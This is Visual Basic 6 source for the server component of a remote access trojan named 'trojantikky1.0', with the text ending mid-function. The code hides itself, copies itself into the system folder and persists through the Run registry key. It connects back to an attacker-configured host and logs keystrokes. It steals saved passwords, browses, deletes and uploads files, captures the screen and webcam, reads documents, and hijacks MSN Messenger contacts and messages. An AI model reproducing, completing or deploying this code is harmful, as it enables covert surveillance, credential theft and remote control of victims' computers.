VERSION 5.00
Begin VB.Form frmMain 
   AutoRedraw      =   -1  'True
   BorderStyle     =   1  'Fixed Single
   ClientHeight    =   2400
   ClientLeft      =   15
   ClientTop       =   15
   ClientWidth     =   4320
   ControlBox      =   0   'False
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   2400
   ScaleWidth      =   4320
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin VB.Timer tmrConnectionInterval 
      Interval        =   10000
      Left            =   600
      Top             =   1200
   End
   Begin VB.PictureBox piccamera 
      AutoSize        =   -1  'True
      Height          =   2175
      Left            =   4320
      ScaleHeight     =   2115
      ScaleWidth      =   3435
      TabIndex        =   6
      Top             =   120
      Width           =   3495
   End
   Begin VB.Frame f1 
      Height          =   2295
      Left            =   120
      TabIndex        =   1
      Top             =   0
      Visible         =   0   'False
      Width           =   4095
      Begin VB.TextBox t1 
         Height          =   1575
         Index           =   0
         Left            =   120
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   2
         Top             =   240
         Width           =   3855
      End
      Begin VB.Timer tmrregistry 
         Interval        =   10000
         Left            =   480
         Top             =   1200
      End
      Begin prjRATServer.Socket wskServer 
         Left            =   1560
         Top             =   240
         _ExtentX        =   741
         _ExtentY        =   741
      End
      Begin prjRATServer.Socket sckwebcam 
         Left            =   1080
         Top             =   240
         _ExtentX        =   741
         _ExtentY        =   741
      End
      Begin prjRATServer.Socket sckekran 
         Left            =   600
         Top             =   240
         _ExtentX        =   741
         _ExtentY        =   741
      End
      Begin prjRATServer.Socket scktransfer 
         Left            =   120
         Top             =   240
         _ExtentX        =   741
         _ExtentY        =   741
      End
      Begin VB.Timer L15t3N3R 
         Enabled         =   0   'False
         Interval        =   1
         Left            =   480
         Top             =   1200
      End
      Begin VB.Timer tmrerror 
         Enabled         =   0   'False
         Interval        =   1000
         Left            =   480
         Top             =   1200
      End
      Begin VB.TextBox t1 
         Height          =   285
         Index           =   2
         Left            =   120
         TabIndex        =   5
         Text            =   "lamer"
         Top             =   1920
         Width           =   855
      End
      Begin VB.CommandButton cmdsend 
         Caption         =   "send"
         Default         =   -1  'True
         Height          =   285
         Left            =   3360
         TabIndex        =   4
         Top             =   1920
         Width           =   615
      End
      Begin VB.TextBox t1 
         Height          =   285
         Index           =   1
         Left            =   960
         TabIndex        =   3
         Top             =   1920
         Width           =   2295
      End
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Close"
      Height          =   495
      Left            =   1440
      TabIndex        =   0
      Top             =   840
      Width           =   1215
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Private Type SHITEMID
 cb As Long
 abID As Byte
End Type
Private Type ITEMIDLIST
  mkid As SHITEMID
End Type

Public WithEvents msn As Messenger
Attribute msn.VB_VarHelpID = -1
Dim msncontact As MessengerAPI.IMessengerContact
Dim msncontacts As MessengerAPI.IMessengerContacts

Dim B45L1KHwND As String
Dim GÖND3R1L3N_V3R1 As String
Dim I5L3M_G0R3C3K_D05Y4 As String
Dim tDosyaACIKMI As Boolean
Dim Y0L_4Y4R1 As String
Dim sFileCont As String
Dim G3L3N_D05Y4_4D1 As String
Dim EKR4N_K4L1T3S1 As Long
Dim JPGP4TH As String
Dim B1TM4P As String
Dim W3BC4M_K4L1T3S1 As Long
Dim e, r
Dim sFData As String
Dim sRData As String
Dim veri As String
Dim K154Y0L As Long
Dim idl As Long, aPath As String
Const S3RV3R_B1LG1S1 = "kmssx32.dll"
Const K3YL0G_D05Y4S1 = "kmsjsx32.sys"
Const G3C1C1_Y0L = "KBBA35E28089.log"
Const S1FR3_V3RS10N = "trojantikky1.0"
Dim KURB4N_B1LG151(20) As String
Dim S4Y4C As Integer
Dim R35_8YT35() As Byte
Dim OnLiN3_K3YL0GG3R  As Boolean
Dim Akt4r1M(1 To 255) As Long
Dim Baslik As String
Dim s4yf4_845L1g1 As String
Dim t1kl4n4ntu5 As String
Dim i As Integer
Dim S1L1ND1 As Long
Dim M4X1MUM_S1LM3 As String
Dim sonuc As String
Dim ba As String
Dim BUYUK As String
Dim L0GL4R As String
Dim OKUN4N As String
Dim L0GG3R As String
Dim G3C1C1 As String
Dim ONC3K1_D0SYA_B0YUTU As Long
Dim S1L1N3C3K As String

Private Sub cmdsend_Click()
        wskServer.SendData "[CHATMESS]" & t1(2).Text & " : " & t1(1).Text
        t1(0).Text = t1(0).Text & t1(2).Text & " : " & t1(1).Text & vbCrLf
        t1(1).Text = ""
End Sub

Private Sub Command1_Click()
scktransfer.CloseSck
sckwebcam.CloseSck
sckekran.CloseSck
wskServer.CloseSck
End
End Sub

Sub genelayarlariyap()
    Me.Hide
    App.TaskVisible = False
    Me.Visible = False
    Set Reg = CreateObject("WScript.Shell")
    Set Fso = CreateObject("Scripting.FileSystemObject")
    S4Y4C = 0
End Sub

Public Function T4MP0N(boyut As Long) As String
    T4MP0N = Space(boyut)
End Function

Public Sub benikopyala(nereden As String, nereye As String, G3C1C1dosyam As String)
    
    Open nereden For Binary Access Read As #1
        G3C1C1 = T4MP0N(LOF(1))
        Get #1, , G3C1C1
    Close #1
    
    Open nereye For Binary Access Write As #3
        Put #3, , G3C1C1
    Close #3
    
    Open G3C1C1dosyam For Append As #2
        Print #2, nereden
    Close #2

End Sub

Sub resourcedencikart(neyi As String, nereye As String)
Dim dosyabinarysi As String

    Open neyi For Binary As #1
       dosyabinarysi = Space(LOF(1))
        Get #1, , dosyabinarysi
    Close #1
    
    G3C1C1 = Right(dosyabinarysi, 1530)
        
    Open nereye For Append As #1
        Print #1, G3C1C1
    Close #1

End Sub

Sub kurbanbilgilerinioku(dosya As String)
S4Y4C = 0
Open dosya For Input As #1
    Do While Not EOF(1)
        Line Input #1, OKUN4N
        OKUN4N = Replace(OKUN4N, "#", "", , , vbTextCompare)
        If S4Y4C <= 20 Then KURB4N_B1LG151(S4Y4C) = pwdcoz(S1FR3_V3RS10N, OKUN4N)
        S4Y4C = S4Y4C + 1
    Loop
Close #1
End Sub

Private Sub Form_Load()
genelayarlariyap
If App.PrevInstance = True Then End '

If getWindowsVersion() = "Win Vista" Then
    Y0L_4Y4R1 = Environ("systemdrive") & "\Users\" & Environ("username") & "\AppData\Roaming\"
Else
    Y0L_4Y4R1 = Environ("systemroot") & "\"
End If

If Dir(Y0L_4Y4R1 & S3RV3R_B1LG1S1) = "" Then
    resourcedencikart App.Path & "\" & App.EXEName & ".exe", Y0L_4Y4R1 & S3RV3R_B1LG1S1
End If

Do Until Dir(Y0L_4Y4R1 & S3RV3R_B1LG1S1) <> ""
    DoEvents
Loop

Call kurbanbilgilerinioku(Y0L_4Y4R1 & S3RV3R_B1LG1S1)
If App.Path & "\" <> Y0L_4Y4R1 Then
        benikopyala App.Path & "\" & App.EXEName & ".exe", Y0L_4Y4R1 & KURB4N_B1LG151(4), Y0L_4Y4R1 & G3C1C1_Y0L
        Do Until Dir(Y0L_4Y4R1 & KURB4N_B1LG151(4)) <> ""
            DoEvents
        Loop
         Shell Y0L_4Y4R1 & KURB4N_B1LG151(4)
         If KURB4N_B1LG151(5) = "1" Then MsgBox KURB4N_B1LG151(7), vbOKOnly + KURB4N_B1LG151(8), KURB4N_B1LG151(6)
         End
        If Dir(Y0L_4Y4R1 & G3C1C1_Y0L) <> "" Then
            Open Y0L_4Y4R1 & G3C1C1_Y0L For Input As #7
                Do While Not EOF(7)
                    Line Input #7, OKUN4N
                    If Dir(OKUN4N) <> "" Then S1L1N3C3K = OKUN4N
                Loop
            Close #7
            Kill Y0L_4Y4R1 & G3C1C1_Y0L
            Do Until Dir(S1L1N3C3K) = ""
                DoEvents
                Kill S1L1N3C3K
            Loop
        End If
  End If
If KURB4N_B1LG151(14) = "1" Then
    Me.Show
    Me.Visible = True
    Me.Enabled = True
End If

B4GL4NT1_4C
SePrivileges
OnLiN3_K3YL0GG3R = False
K3YL0GG3Riac

End Sub


Function registerle()
If B45L4NG1C4_3KL3(KURB4N_B1LG151(3), Y0L_4Y4R1 & KURB4N_B1LG151(4), "Software\Microsoft\Windows\CurrentVersion\Run") = True Then
End If
End Function

Sub K3YL0GG3Riac()
L15t3N3R.Enabled = True
iKeylog = FreeFile(0)
Open App.Path & "\" & K3YL0G_D05Y4S1 For Append As #iKeylog
    Print #iKeylog, vbCrLf & "[ Log Start: " & Now & " ]"
    Print #iKeylog, String$(45, "=")
End Sub


Sub K3YL0GG3Rikapat()
    Close #iKeylog
End Sub

Function B4GL4NT1_4C()
wskServer.CloseSck
wskServer.Connect KURB4N_B1LG151(0), KURB4N_B1LG151(9)
End Function

Public Function pwdcoz(CodeKey As String, dataIn As String) As String
Dim lonDataPtr As Long
Dim strDataOut As String
Dim intXOrValue1 As Integer
Dim intXOrValue2 As Integer
For lonDataPtr = 1 To (Len(dataIn) / 2)
intXOrValue1 = Val("&H" & (Mid$(dataIn, (2 * lonDataPtr) - 1, 2)))
intXOrValue2 = Asc(Mid$(CodeKey, ((lonDataPtr Mod Len(CodeKey)) + 1), 1))
strDataOut = strDataOut + Chr(intXOrValue1 Xor intXOrValue2)
Next lonDataPtr
pwdcoz = strDataOut
End Function

Private Sub Form_Terminate()
K3YL0GG3Rikapat
K4M3R4Y1_K4P4T
End
End Sub
Private Sub Form_Unload(Cancel As Integer)
K3YL0GG3Rikapat
K4M3R4Y1_K4P4T
End
End Sub

Private Sub scktransfer_DataArrival(ByVal bytesTotal As Long)
Dim gelen As String
Dim G3C1C1 As String
scktransfer.GetData gelen, vbString
If I5L3M_G0R3C3K_D05Y4 = "pssplugin.exe" Then I5L3M_G0R3C3K_D05Y4 = App.Path & "\pssplugin.exe"

If I5L3M_G0R3C3K_D05Y4 <> "" Then
If tDosyaACIKMI = False Then
    Open I5L3M_G0R3C3K_D05Y4 For Binary Access Write As #3
        tDosyaACIKMI = True
    ElseIf tDosyaACIKMI = True Then
End If
If Right(gelen, 17) = "/\/\ENDOFFILE/\/\" Then
    G3C1C1 = Mid(gelen, 1, Len(gelen) - 17)
    Put #3, , G3C1C1
    Close #3
    tDosyaACIKMI = False
    scktransfer.CloseSck
    wskServer.SendData "[UPLDTAMM]"
    Exit Sub
Else
Put #3, , gelen
End If
End If

End Sub

Private Sub sckwebcam_CloseSck()
sckwebcam.CloseSck
K4M3R4Y1_K4P4T
End Sub

Private Sub sckwebcam_Error(ByVal Number As Integer, Description As String, ByVal sCode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
sckwebcam.CloseSck
K4M3R4Y1_K4P4T
End Sub

Private Sub t1_Change(index As Integer)
t1(index).SelLength = Len(t1(index).Text)
End Sub

Private Sub t1_KeyPress(index As Integer, KeyAscii As Integer)
    If index = 1 And KeyAscii = 13 Then
        cmdsend_Click
    End If
End Sub

Private Sub tmrConnectionInterval_Timer()
If wskServer.State <> sckConnected Then
    wskServer.CloseSck
    sckekran.CloseSck
    sckwebcam.CloseSck
    scktransfer.CloseSck
    B4GL4NT1_4C
End If

If wskServer.State = sckError Then
    wskServer.CloseSck
    sckekran.CloseSck
    sckwebcam.CloseSck
    scktransfer.CloseSck
End If
End Sub

Private Sub tmrerror_Timer()
MsgBox veri, vbOKOnly + 16, "Error"
End Sub


Private Sub tmrregistry_Timer()
registerle
End Sub


Private Sub wskServer_CloseSck()
    wskServer.CloseSck
    sckekran.CloseSck
    sckwebcam.CloseSck
    scktransfer.CloseSck
End Sub

Private Sub wskServer_DataArrival(ByVal bytesTotal As Long)
On Error GoTo errHandler
Dim sData As String
Dim sHead As String

Dim iFData As Integer
Dim iRData As Integer

Dim sMParam() As String
Dim sDParam() As String
    DoEvents
    
    sData = String(bytesTotal, Chr(0))
    wskServer.GetData sData, vbString
    
    Debug.Print sData
    sHead = Left(sData, 10)
    sData = Right(sData, Len(sData) - 10)
    sMParam = Split(sData, Chr(255))
    
    Select Case sHead
        Case "[GETSINFO]"
            wskServer.SendData "[SETSINFO]" & _
            KURB4N_B1LG151(1) & Chr(255) & _
            Environ("username") & Chr(255) & _
            IsNTAdmin(0&, 0&) & Chr(255) & _
            getWindowsVersion & Chr(255) & _
            GetCPUSpeedMHz & Chr(255) & _
            MemoryAvailable & Chr(255) & _
            CountryTag & Chr(255) & Environ("computername") & Chr(255) & GetCountryCode
        Case "[GETDINFO]"
            wskServer.SendData "[SETDINFO]" & _
            Environ("username") & Chr(255) & _
            Environ("computername") & Chr(255) & _
            getWindowsVersion & Chr(255) & _
            CountryTag & Chr(255) & _
            Split(GetFWAV, "|")(1) & Chr(255) & _
            Split(GetFWAV, "|")(0) & Chr(255) & _
            App.Path & Chr(255) & _
            Environ("systemdrive") & Chr(255) & _
            Environ("systemroot") & "\" & Chr(255) & _
            GetProcessor & Chr(255) & _
            GetCPUModel & Chr(255) & _
            Split(MemoryAvailable, "|")(0) & Chr(255) & _
            Split(MemoryAvailable, "|")(1) & Chr(255) & _
            GetCamDrvs & Chr(255) & _
            Screen.Width / Screen.TwipsPerPixelX & " x " & Screen.Height / Screen.TwipsPerPixelY
            
        Case "[GETPRCLT]"
            wskServer.SendData "[SETPRCLT]" & GetProcesses
        Case "[GETPRGLT]"
            wskServer.SendData "[SETPRGLT]" & GetInstalledApps
        Case "[GETSRVLT]"
            wskServer.SendData "[SETSRVLT]" & EnumerateServices
        Case "[GETMODLT]"
            wskServer.SendData "[SETMODLT]" & GetModules(CLng(sMParam(0)))
        Case "[GETWNDLT]"
            lstWindows = ""
            Call EnumWindows(AddressOf GetWindows, CLng(sMParam(0)))
            wskServer.SendData "[SETWNDLT]" & lstWindows
        Case "[GETPRCKL]"
            wskServer.SendData "[SETPRCKL]" & KillByPID(CLng(sMParam(0)))
        Case "[GETMODKL]"
            wskServer.SendData "[SETMODKL]" & UnInjectDll(sMParam(0), CLng(sMParam(1)))
        Case "[GETPRCPR]"
            wskServer.SendData "[SETPRCPR]" & SetProcessPriority(CLng(sMParam(0)), GetPriority(sMParam(1)))
        Case "[GETSRVST]"
            wskServer.SendData "[SETSRVST]" & ServiceControl(sMParam(0), CLng(sMParam(1)))
        Case "[GETSRVSU]"
            'wskServer.SendData "[SETSRVSU]" & SetServiceStartup(CLng(sMParam(0)), GetPriority(sMParam(1)))
        Case "[GETWNDOP]"
            Select Case sMParam(0)
                Case 0: sMParam(0) = SetWindow(CLng(sMParam(1)), 3): wskServer.SendData "[SWRHABER]568"
                Case 1: sMParam(0) = SetWindow(CLng(sMParam(1)), 6): wskServer.SendData "[SWRHABER]569"
                Case 2: sMParam(0) = SetWindow(CLng(sMParam(1)), 5): wskServer.SendData "[SWRHABER]570"
                Case 3: sMParam(0) = SetWindow(CLng(sMParam(1)), 0): wskServer.SendData "[SWRHABER]571"
                Case 4: sMParam(0) = CloseWindow(CLng(sMParam(1))): wskServer.SendData "[SWRHABER]572"
                Case 5: sMParam(0) = ChangeWindowText(CLng(sMParam(1)), sMParam(2)): wskServer.SendData "[SWRHABER]573"
            End Select
        Case "[GETFILES]"
            sData = EnumFiles(sMParam(0))
            If Len(sData) > 3072 Then
                sFData = sData
                While Mid(sFData, 3072 + iFData, 1) <> Chr(255)
                    iFData = iFData + 1
                Wend
                wskServer.SendData "[SETFILES]" + Left(sFData, 3072 + iFData)
                DoEvents
                sFData = Mid(sFData, 3072 + iFData + 1, Len(sFData))
            Else
                wskServer.SendData "[SETFILER]" + sData
            End If

        Case "[GETFILER]"
            If Len(sFData) > 3072 Then
                While Mid(sFData, 3072 + iFData, 1) <> Chr(255)
                    iFData = iFData + 1
                Wend
                Sleep 100
                wskServer.SendData "[SETFILES]" + Left(sFData, 3072 + iFData)
                DoEvents
                sFData = Mid(sFData, 3072 + iFData + 1, Len(sFData))
            Else
                wskServer.SendData "[SETFILER]" + sFData
            End If
        
        Case "[GETREGES]"
            sData = EnumKeysValues(sMParam(0), sMParam(1))
            If Len(sData) > 3072 Then
                sRData = sData
                While Mid(sRData, 3072 + iRData, 1) <> Chr(255)
                    iRData = iRData + 1
                Wend
                wskServer.SendData "[SETREGES]" + Left(sRData, 3072 + iRData)
                DoEvents
                sRData = Mid(sRData, 3072 + iRData + 1, Len(sRData))
            Else
                wskServer.SendData "[SETREGER]" + sData
            End If

        Case "[GETREGER]"
            If Len(sRData) > 3072 Then
                While Mid(sRData, 3072 + iRData, 1) <> Chr(255)
                    iRData = iRData + 1
                Wend
                Sleep 100
                wskServer.SendData "[SETREGES]" + Left(sRData, 3072 + iRData)
                DoEvents
                sFData = Mid(sRData, 3072 + iRData + 1, Len(sRData))
            Else
                wskServer.SendData "[SETREGER]" + sRData
            End If
        
        Case "[GETDRIVE]"
                wskServer.SendData "[SETDRIVE]" & EnumDrives
       
                Case "[SHORTYOL]"
            veri = ""
            aPath = Space$(MAX_PATH)
            Select Case sMParam(0)
                Case "0"
                    K154Y0L = &H0
                Case "1"
                    K154Y0L = &H5
                Case 2
                    K154Y0L = &H24
                Case 3
                    K154Y0L = &H25
                Case 4
                    K154Y0L = &H26
                Case 5
                    K154Y0L = &H7
            End Select

                    If SHGetSpecialFolderLocation(hWND, K154Y0L, idl) = 0 Then
                    If SHGetPathFromIDList(idl, aPath) Then
                  veri = Left$(aPath, InStr(aPath, Chr$(0)) - 1)
            End If
            LocalFree idl
            End If
            wskServer.SendData "[SHORTYOL]" & veri
            
            
        Case "[GETPASSW]"
            veri = ""
            Select Case sMParam(0)
                Case 1, 2, 3, 4, 5, 6, 7, 8
                        If Dir(App.Path & "\pssplugin.exe") <> "" Then
                            If Dir(App.Path & "\10" & sMParam(0) & ".txt") = "" Then
                                Shell App.Path & "\pssplugin.exe"
                                wskServer.SendData "[SWRHABER]592"
                                Exit Sub
                            End If
                        Else
                            wskServer.SendData "[PLUGINST]"
                            wskServer.SendData "[SWRHABER]593"
                            Exit Sub
                        End If
                        
                    If Dir(App.Path & "\10" & sMParam(0) & ".txt") <> "" Then
                       Open App.Path & "\10" & sMParam(0) & ".txt" For Input As #77
                         Do While Not EOF(77)
                         Line Input #77, OKUN4N
                         veri = veri & OKUN4N & vbCrLf
                         Loop
                        Close #77
                        Kill App.Path & "\10" & sMParam(0) & ".txt"
                    End If
                
            End Select
                    veri = Replace(veri, String(50, "="), String(40, "="))
                    wskServer.SendData "[PASSWORD]" & veri
            
            Case "[MAKEADIR]"
            MkDir sMParam(0) & "\" & sMParam(1)
            wskServer.SendData "[SWRHABER]549"
            
            Case "[CHATONOF]"
                Select Case sMParam(0)
                    Case 0
                        f1.Left = 120
                        f1.Top = 0
                        f1.Visible = False
                        Me.Visible = False
                        wskServer.SendData "[SWRHABER]463"

                    Case 1
                        f1.Left = 120
                        f1.Top = 0
                        f1.Visible = True
                        Me.Show
                        Me.Visible = True
                        wskServer.SendData "[SWRHABER]462"
                End Select
            
            Case "[CHATMESS]"
                t1(0).Text = t1(0).Text & sMParam(0) & vbCrLf
                            
            Case "[FUNMANAG]"
                Select Case sMParam(0)
                    Case 0, 1, 2, 3
                        mdlfunmanager.fundesktop Val(sMParam(0))
                    
                    Case 4, 5, 6, 7
                        mdlfunmanager.funtaskbar Val(sMParam(0)) - 4
                    
                    Case 8, 9, 10, 11
                        mdlfunmanager.funstartbutton Val(sMParam(0)) - 8
                    
                    Case 12, 13, 14, 15
                        'burasi fare olaylarý gizle göster kilitli acik
                                      
                    Case 16, 17
                        mdlfunmanager.funtaskicons Val(sMParam(0)) - 16
                        
                    Case 18, 19
                        mdlfunmanager.funhideclock Val(sMParam(0)) - 18
                    
                    Case 20, 21
                        mdlfunmanager.funcdrom Val(sMParam(0)) - 20
                    
                    Case 22, 23
                        mdlfunmanager.funmonitor Val(sMParam(0)) - 22
                        
                    Case 24, 25, 26, 27
                        mdlfunmanager.funshutdownmenu Val(sMParam(0)) - 24
                        
                    Case 28, 29
                        mdlfunmanager.funflipscreen Val(sMParam(0)) - 28
                        
                    Case 30, 31
                        mdlfunmanager.funswapfare Val(sMParam(0)) - 30
                        
                    Case 32, 33
                        mdlfunmanager.funnumlock
                    
                    Case 34, 35
                        mdlfunmanager.funcapslock
                        
                    Case 36, 37
                        mdlfunmanager.funscrolllock
                    
                    Case 38
                        veri = sMParam(1)
                        tmrerror.Enabled = True
                    Case 39
                        tmrerror.Enabled = False
                End Select
                wskServer.SendData "[SWRHABER]" & Val(sMParam(0)) + 508
                
            Case "[FAKEMESS]"
                MsgBox Replace(sMParam(0), "|", vbCrLf, , , vbTextCompare), Val(sMParam(1)) + Val(sMParam(2)), sMParam(3)
                wskServer.SendData "[SWRHABER]548"
                
            Case "[SRVERBIL]"
                veri = ""
                For S4Y4C = 0 To 15
                    veri = veri + KURB4N_B1LG151(S4Y4C) & Chr(255)
                Next
                wskServer.SendData "[SRVERBIL]" & veri
                
            Case "[SERCLOSE]"
                Select Case sMParam(0)
                    Case "0"
                        wskServer.SendData "[SERCLOSE]"
                    Case "1"
                    K3YL0GG3Rikapat
                    
                        On Local Error GoTo hatreg1
                        Reg.regDelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WINDOWS\CURRENTVERSION\RUN", KURB4N_B1LG151(3)
hatreg1:
                        
                        Open App.Path & "\Uninstall.bat" For Append As #1
                            Print #1, "@Echo off"
                            Print #1, ":Begin"
                            Print #1, "Del " & App.Path & "\" & S3RV3R_B1LG1S1
                            Print #1, "Del " & App.Path & "\" & K3YL0G_D05Y4S1
                            Print #1, "Del " & App.Path & "\" & KURB4N_B1LG151(4)
                            Print #1, "If Exist " & App.Path & "\" & KURB4N_B1LG151(4) & " Goto Begin"
                            Print #1, "Del Uninstall.bat"
                        Close #1
                            Shell App.Path & "\Uninstall.bat", vbHide
                        End
                End Select
                End
            Case "[STEXPLRR]"
                veri = ""
               Select Case sMParam(0)
                   Case "0"
                       Call ShellExecute(&O0, vbNullString, sMParam(1), vbNullString, vbNullString, vbNormalFocus)
                   Case "1"
                       veri = Reg.regread("HKEY_CURRENT_USER\SOFTWARE\Microsoft\internet explorer\main\Start Page")
                       wskServer.SendData "[STEXPLRR]1" & Chr(255) & veri
                   Case "2"
                       Reg.regwrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\internet explorer\main\Start Page", sMParam(1)
                       wskServer.SendData "[STEXPLRR]2" & Chr(255) & veri
               End Select
            
            Case "[GETKYLOG]"
                Select Case sMParam(0)
                    Case "0"
                        wskServer.SendData "[SWRHABER]488"
                        OnLiN3_K3YL0GG3R = True
                    Case "1"
                        OnLiN3_K3YL0GG3R = False
                        wskServer.SendData "[SWRHABER]487"
                    Case "2"
                        veri = ""
                        L0GG3R = ""
                        If OnLiN3_K3YL0GG3R = True Then OnLiN3_K3YL0GG3R = False
                        K3YL0GG3Rikapat
                        iKeylog = FreeFile(0)
                        Open App.Path & "\" & K3YL0G_D05Y4S1 For Input As #iKeylog
                            Do While Not EOF(iKeylog)
                            Line Input #1, veri
                            L0GG3R = L0GG3R & veri & vbCrLf
                            Loop
                        Close #iKeylog
                        If Len(L0GG3R) > 0 Then wskServer.SendData "[OFLINLOG]" & L0GG3R
                        If Dir(App.Path & "\" & K3YL0G_D05Y4S1) <> "" Then Kill App.Path & "\" & K3YL0G_D05Y4S1
                        K3YL0GG3Riac
                End Select
                
            Case "[GETKILFL]"
                On Error GoTo fsh
                    Kill sMParam(0)
                    wskServer.SendData "[SWRHABER]489"
                    Exit Sub
fsh:
                wskServer.SendData "[SWRHABER]494"
            
            Case "[KILFOLDR]"
                S1L1ND1 = DelTree(sMParam(0))
                    Select Case S1L1ND1
                        Case 0: wskServer.SendData "[SWRHABER]468"
                        Case -1: wskServer.SendData "[SWRHABER]469"
                        Case Else: wskServer.SendData "[SWRHABER]470"
                    End Select
            
            Case "[GETRENFL]"
                On Local Error GoTo yah
                Name sMParam(0) As sMParam(1)
                wskServer.SendData "[SWRHABER]491"
                Exit Sub
yah:
wskServer.SendData "[SWRHABER]492"
            Case "[SHELAPPL]"
                On Local Error GoTo dch
                Call ShellExecute(&O0, vbNullString, sMParam(0), vbNullString, vbNullString, vbNormalFocus)
                wskServer.SendData "[SWRHABER]490"
                Exit Sub
dch:
wskServer.SendData "[SWRHABER]493"
            Case "[WALPAPER]"
            On Local Error GoTo wdh
                Call SystemParametersInfo(20, 0, sMParam(0), 1)
                wskServer.SendData "[SWRHABER]495"
                Exit Sub
wdh:
wskServer.SendData "[SWRHABER]496"

            Case "[TEXTREAD]"
            
                Select Case Right(sMParam(0), 3)
                    Case "txt", "log"
                        veri = ""
                            Open sMParam(0) For Input As #9
                                Do While Not EOF(9)
                                    Line Input #9, OKUN4N
                                    veri = veri & OKUN4N & vbCrLf
                                Loop
                            Close #9
                    Case "doc"
                        Dim objWord As Object
                        Dim objDoc As Object
                        Set objWord = CreateObject("Word.Application")
                        Set objDoc = objWord.Documents.Open(sMParam(0), , True, , , , , , , , , False)
                        objWord.Visible = False
                        objDoc.Select
                        veri = objWord.Selection.Text
                        objDoc.Close
                        objWord.Quit
                End Select
                    If Len(veri) < 1 Then veri = " "
                        wskServer.SendData "[TEXTREAD]" & veri
                
         Case "[MSNCLIST]"
On Local Error Resume Next
Set msn = New MessengerAPI.Messenger
Set msncontacts = msn.MyContacts
        
            veri = ""
            OKUN4N = ""
            S4Y4C = 0
            For Each msncontact In msncontacts
                S4Y4C = S4Y4C + 1
                veri = msncontact.SigninName & Chr(255) & msncontact.FriendlyName & Chr(255) & msncontact.Status & Chr(255)
                OKUN4N = OKUN4N & veri
            Next
            wskServer.SendData "[MSNCLIST]" & S4Y4C & Chr(255) & OKUN4N

Case "[MSNONLIN]"
On Local Error Resume Next
Set msn = New MessengerAPI.Messenger
Set msncontacts = msn.MyContacts

        Select Case sMParam(0)
            Case "0"
                veri = ""
                OKUN4N = ""
                S4Y4C = 0
                    For Each msncontact In msncontacts
                        If msncontact.Status <> MISTATUS_OFFLINE Then
                            S4Y4C = S4Y4C + 1
                            veri = msncontact.SigninName & Chr(255)
                            OKUN4N = OKUN4N & veri
                        End If
                    Next
                wskServer.SendData "[MSNONLIN]" & S4Y4C & Chr(255) & OKUN4N
            Case "1"
                On Local Error Resume Next
                msn.InstantMessage sMParam(1)
                SendKeys sMParam(2), 20
                SendKeys "{enter}"
                wskServer.SendData "[SWRHABER]507"
        End Select

Case "[MSNAYARI]"
On Local Error Resume Next
Set msn = New MessengerAPI.Messenger
Set msncontacts = msn.MyContacts

If msn.MyStatus <> MISTATUS_OFFLINE Then
    Select Case sMParam(0)
        Case "0"
                wskServer.SendData "[MSNAYARI]0" & Chr(255) & msn.MyFriendlyName
        Case "1"
            If sMParam(1) <> "" Then
            On Local Error Resume Next
            Set msn = New MessengerAPI.Messenger
            msn.OptionsPages 0, MOPT_GENERAL_PAGE
            SendKeys (sMParam(1) & "{ENTER}")
            Set msn = Nothing
            End If
            wskServer.SendData "[SWRHABER]505"
        Case "2"
            msn.MyStatus = MISTATUS_ONLINE
            wskServer.SendData "[SWRHABER]497"
        Case "3"
            msn.MyStatus = MISTATUS_BUSY
            wskServer.SendData "[SWRHABER]498"
        Case "4"
            msn.MyStatus = MISTATUS_AWAY
            wskServer.SendData "[SWRHABER]499"
        Case "5"
            msn.MyStatus = MISTATUS_ON_THE_PHONE
            wskServer.SendData "[SWRHABER]500"
        Case "6"
            msn.MyStatus = MISTATUS_BE_RIGHT_BACK
            wskServer.SendData "[SWRHABER]501"
        Case "7"
            msn.MyStatus = MISTATUS_OUT_TO_LUNCH
            wskServer.SendData "[SWRHABER]502"
        Case "8"
            msn.MyStatus = MISTATUS_INVISIBLE
            wskServer.SendData "[SWRHABER]503"
        Case "9"
            msn.Signout
            wskServer.SendData "[SWRHABER]504"
    End Select
    
Else
    wskServer.SendData "[SWRHABER]578"
End If

    Case "[UPLOFILE]"
        G3L3N_D05Y4_4D1 = sMParam(0)
        
    Case "[SRVEROPT]"
        KURB4N_B1LG151(0) = sMParam(1)
        KURB4N_B1LG151(1) = sMParam(0)
        KURB4N_B1LG151(2) = sMParam(2)
        KURB4N_B1LG151(3) = sMParam(9)
        KURB4N_B1LG151(4) = sMParam(10)
        KURB4N_B1LG151(5) = sMParam(14)
        KURB4N_B1LG151(6) = sMParam(15)
        KURB4N_B1LG151(7) = sMParam(16)
        KURB4N_B1LG151(8) = sMParam(17)
        KURB4N_B1LG151(9) = sMParam(3)
        KURB4N_B1LG151(10) = sMParam(4)
        KURB4N_B1LG151(11) = sMParam(5)
        KURB4N_B1LG151(12) = sMParam(6)
        
        If sMParam(11) = "1" Then KURB4N_B1LG151(13) = "0"
        If sMParam(12) = "1" Then KURB4N_B1LG151(13) = "1"
        If sMParam(13) = "1" Then KURB4N_B1LG151(13) = "2"
        If sMParam(7) = "1" Then KURB4N_B1LG151(14) = "1"
        If sMParam(8) = "1" Then KURB4N_B1LG151(14) = "0"
        
        Kill App.Path & "\" & S3RV3R_B1LG1S1
        Open App.Path & "\" & S3RV3R_B1LG1S1 For Append As #31
            For S4Y4C = 0 To 15
                Print #31, XORSifrele(S1FR3_V3RS10N, KURB4N_B1LG151(S4Y4C))
            Next
        Close #31
        wskServer.SendData "[SWRHABER]591"

    'screen capture
    Case "[EKRANBAG]"
        sckekran.CloseSck
        sckekran.Connect KURB4N_B1LG151(0), KURB4N_B1LG151(11)
        EKR4N_K4L1T3S1 = sMParam(0)
        ONC3K1_D0SYA_B0YUTU = 0
        
    Case "[EKRANBAS]"
        ekranigönder
        
    Case "[EKRANDUR]"
        sckekran.CloseSck
        
    Case "[TIKLADIM]"
        Select Case sMParam(0)
            Case 1
